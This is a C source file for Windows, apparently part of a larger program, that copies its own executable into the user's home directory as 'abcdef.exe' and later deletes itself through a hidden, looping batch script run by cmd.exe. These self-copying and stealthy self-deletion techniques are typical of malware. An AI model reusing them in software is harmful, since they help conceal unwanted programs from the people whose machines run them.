#include <limits.h>
#include <windows.h>

#include "config.h"
#include "common.h"
#include "coreinstall.h"
#include "file.h"
#include "log.h"
#include "str.h"
#include "util.h"

struct installer
{
	char pname[MAX_PATH];
};

bool
self_install()
{
	struct installer inst;
	char home[MAX_PATH];
	char pname[MAX_PATH];

	DEBUG(LOG_DEFAULT, "installation init\n");

	if (!get_program_name(pname, MAX_PATH))
		return false;
	DEBUG(LOG_DEFAULT, "progname is %s\n", pname);
	installer_init(&inst, pname);
	if (installer_get_target_path(&inst, home, sizeof(home)))
		return false;
	installer_install(&inst, home);

	installer_clear(&inst);

	return true;
}

bool
self_uninstall()
{
	bool ret;
	char pname[MAX_PATH];
	struct installer inst;

	if (!get_program_name(pname, MAX_PATH))
		return false;
	DEBUG(LOG_DEFAULT, "progname is %s\n", pname);
	installer_init(&inst, pname);

	ret = installer_uninstall(&inst);

	installer_clear(&inst);

	return ret;
}

void
installer_init(struct installer *inst, char *appname)
{
	assert(inst != NULL && appname != NULL);

	DEBUG(LOG_VERBOSE, "Try to install %s\n", appname);
	str_ncpy(inst->pname, appname, sizeof(inst->pname));
}

void
installer_clear(struct installer *inst)
{
	assert(inst != NULL);

	DEBUG(LOG_VERBOSE, "Installer finalize\n");

}

bool
installer_install(struct installer *inst, char *to_path)
{
	assert(inst != NULL && inst->pname != NULL && to_path != NULL);

	DEBUG(LOG_VERBOSE, "Install %s to %s\n", inst->pname, to_path);
	if (!CopyFile(inst->pname, to_path, false)) {
		DEBUG(LOG_DEFAULT, "can't copy file\n");
		return false;
	}
	return true;
}

bool
installer_get_target_path(struct installer *inst, char *buf, int sz)
{
	assert(inst != NULL && buf != NULL && sz >= 0);

	char fname[] = "abcdef.exe";

	if (!get_home_dir(buf, sz))
		return false;

	sz -= str_len(buf);

	if (sz > str_len(fname))
		str_cat(buf, fname);
	else
		return false;

	return true;
}


bool
installer_uninstall(struct installer *inst)
{
	int ret;
	char batname[PATH_MAX];
	char *script = NULL;
	char pname[MAX_PATH];

	assert(inst != NULL);

	DEBUG(LOG_DEFAULT, "self deleting\n");

	//йобаная винда
	CharToOem(inst->pname, pname);

	if (!file_create_temp_file(batname, sizeof(batname), NULL, ".bat"))
		return false;
	ret = str_sprintf_ex(&script,
	    "@echo off\r\n"
	    ":loop\r\n"
	    "del \"%s\"\r\n"
	    "if exist \"%s\" goto loop\r\n"
	   /* "del \"%s\"\r\n"*/,
	    pname, pname, batname);
	if (ret != true)
		return false;
	DEBUG(LOG_VERBOSE, "builded script: %s\n", batname);
	if (!file_write_to_file(batname, script, str_len(script)))
		return false;
	/* run bat file */
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		char *cmdline = NULL;
		ret = str_sprintf_ex(&cmdline,
		    "%s /c \"%s\"", "cmd.exe", batname);

		DEBUG(LOG_VERBOSE, "cmd line is: %s\n", cmdline);

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		CreateProcessA(NULL, cmdline,
		    NULL, NULL,
		    false, 0,
		    NULL, NULL,
		    &si, &pi);
		win_perror("createprocess");
		free (cmdline);
	}
	free(script);

	exit(0);
err:
	DEBUG(LOG_DEFAULT, "can't destroy myself=(\n");
	file_delete(batname);
	return false;
}

